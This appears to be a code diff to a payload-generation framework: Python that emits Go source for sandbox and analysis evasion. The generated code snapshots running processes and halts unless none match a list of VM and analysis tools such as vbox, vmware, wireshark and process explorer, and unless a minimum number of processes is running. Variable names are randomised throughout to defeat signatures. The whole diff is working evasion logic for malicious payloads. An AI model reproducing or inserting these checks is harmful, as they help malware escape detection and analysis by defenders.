@@ -678,6 +678,114 @@ def senecas_games(evasion_payload):
             proc32first = evasion_helpers.randomString()
             proc32next = evasion_helpers.randomString()
             closehandle = evasion_helpers.randomString()
+            procentry32 = evasion_helpers.randomString()
+            ev_of_sandbox = evasion_helpers.randomString()
+            sbox_procs = evasion_helpers.randomString()
+            hproc_snap = evasion_helpers.randomString()
+            exe_names = evasion_helpers.randomString()
+            pe32 = evasion_helpers.randomString()
+            ret_val = evasion_helpers.randomString()
+            exe = evasion_helpers.randomString()
+            sbox_process = evasion_helpers.randomString()
+
+            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
+            check_code += 'var ' + createtoolhelp + ' = ' + kernel32 + '.NewProc("CreateToolhelp32Snapshot")\n'
+            check_code += 'var ' + proc32first + ' = ' + kernel32 + '.NewProc("Process32FirstW")\n'
+            check_code += 'var ' + proc32next + ' = ' + kernel32 + '.NewProc("Process32NextW")\n'
+            check_code += 'var ' + closehandle + ' = ' + kernel32 + '.NewProc("CloseHandle")\n'
+            check_code += 'type ' + procentry32 + ' struct {\n'
+            check_code += '\tdwSize\t\tuint32\n'
+            check_code += '\tcntUsage\t\tuint32\n'
+            check_code += '\tth32ProcessID\t\tuint32\n'
+            check_code += '\tth32DefaultHeapID\t\tuintptr\n'
+            check_code += '\tth32ModuleID\t\tuint32\n'
+            check_code += '\tcntThreads\t\tuint32\n'
+            check_code += '\tth32ParentProcessID\t\tuint32\n'
+            check_code += '\tpcPriClassBase\t\tint32\n'
+            check_code += '\tdwFlags\t\tuint32\n'
+            check_code += '\tszExeFile\t\t[260]uint16\n'
+            check_code += '}\n'
+            check_code += ev_of_sandbox + ' := make([]string, 0)\n'
+            check_code += sbox_procs + " := [...]string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`, `vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`, `vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`, `vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}\n"
+            check_code += hproc_snap + ', _, _ := ' + createtoolhelp + '.Call(2,0)\n'
+            check_code += 'defer ' + closehandle + '.Call(' + hproc_snap + ')\n'
+            check_code += exe_names + ' := make([]string, 0, 100)\n'
+            check_code += 'var ' + pe32 + ' ' + procentry32 + '\n'
+            check_code += pe32 + '.dwSize = uint32(unsafe.Sizeof(' + pe32 + '))\n'
+            check_code += proc32first + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
+            check_code += 'for {\n'
+            check_code += '\t' + exe_names + ' = append(' + exe_names + ', syscall.UTF16ToString(' + pe32 + '.szExeFile[:260]))\n'
+            check_code += '\t' + ret_val + ', _, _ := ' + proc32next + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
+            check_code += '\tif ' + ret_val + ' == 0 {\n'
+            check_code += '\t\tbreak\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'for _, ' + exe + ' := range ' + exe_names + ' {\n'
+            check_code += '\tfor _, ' + sbox_process + ' := range ' + sbox_procs + ' {\n'
+            check_code += '\t\tif (strings.Contains(strings.ToLower(' + exe + '), strings.ToLower(' + sbox_process + '))) {\n'
+            check_code += '\t\t\t' + ev_of_sandbox + ' = append(' + ev_of_sandbox + ', ' + exe + ')\n'
+            check_code += '\t\t}\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if len(' + ev_of_sandbox + ') == 0 {\n'
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["MINPROCS"][0].lower() != 'x':
+            
+            kernel32 = evasion_helpers.randomString()
+            createtoolhelp = evasion_helpers.randomString()
+            proc32first = evasion_helpers.randomString()
+            proc32next = evasion_helpers.randomString()
+            closehandle = evasion_helpers.randomString()
+            min_processes = evasion_helpers.randomString()
+            procentry32 = evasion_helpers.randomString()
+            hproc_snap = evasion_helpers.randomString()
+            exe_names = evasion_helpers.randomString()
+            pe32 = evasion_helpers.randomString()
+            ret_val = evasion_helpers.randomString()
+            exe = evasion_helpers.randomString()
+            count_running_procs = evasion_helpers.randomString()
+            wut = evasion_helpers.randomString()
+
+            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
+            check_code += 'var ' + createtoolhelp + ' = ' + kernel32 + '.NewProc("CreateToolhelp32Snapshot")\n'
+            check_code += 'var ' + proc32first + ' = ' + kernel32 + '.NewProc("Process32FirstW")\n'
+            check_code += 'var ' + proc32next + ' = ' + kernel32 + '.NewProc("Process32NextW")\n'
+            check_code += 'var ' + closehandle + ' = ' + kernel32 + '.NewProc("CloseHandle")\n'
+            check_code += 'type ' + procentry32 + ' struct {\n'
+            check_code += '\tdwSize\t\tuint32\n'
+            check_code += '\tcntUsage\t\tuint32\n'
+            check_code += '\tth32ProcessID\t\tuint32\n'
+            check_code += '\tth32DefaultHeapID\t\tuintptr\n'
+            check_code += '\tth32ModuleID\t\tuint32\n'
+            check_code += '\tcntThreads\t\tuint32\n'
+            check_code += '\tth32ParentProcessID\t\tuint32\n'
+            check_code += '\tpcPriClassBase\t\tint32\n'
+            check_code += '\tdwFlags\t\tuint32\n'
+            check_code += '\tszExeFile\t\t[260]uint16\n'
+            check_code += '}\n'
+            check_code += min_processes + ' := ' + evasion_payload.required_options["MINPROCS"][0] + '\n'
+            check_code += hproc_snap + ', _, _ := ' + createtoolhelp + '.Call(2,0)\n'
+            check_code += 'defer ' + closehandle + '.Call(' + hproc_snap + ')\n'
+            check_code += exe_names + ' := make([]string, 0, 100)\n'
+            check_code += 'var ' + pe32 + ' ' + procentry32 + '\n'
+            check_code += pe32 + '.dwSize = uint32(unsafe.Sizeof(' + pe32 + '))\n'
+            check_code += proc32first + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
+            check_code += 'for {\n'
+            check_code += '\t' + exe_names + ' = append(' + exe_names + ', syscall.UTF16ToString(' + pe32 + '.szExeFile[:260]))\n'
+            check_code += '\t' + ret_val + ', _, _ := ' + proc32next + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
+            check_code += '\tif ' + ret_val + ' == 0 {\n'
+            check_code += '\t\tbreak\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += count_running_procs + ' := 0\n'
+            check_code += 'for _, ' + exe + ' := range ' + exe_names + ' {\n'
+            check_code += "\tif " + exe + " == \"\" {\n"
+            check_code += "\t\tos.Exit(1)}\n"
+            check_code += '\t' + count_running_procs + ' += 1\n'
+            check_code += '}\n'
+            check_code += 'if (' + count_running_procs + ' >= ' + min_processes + ') {\n'
+            num_tabs_required += 1
 
         # Return check information
         return check_code, num_tabs_required
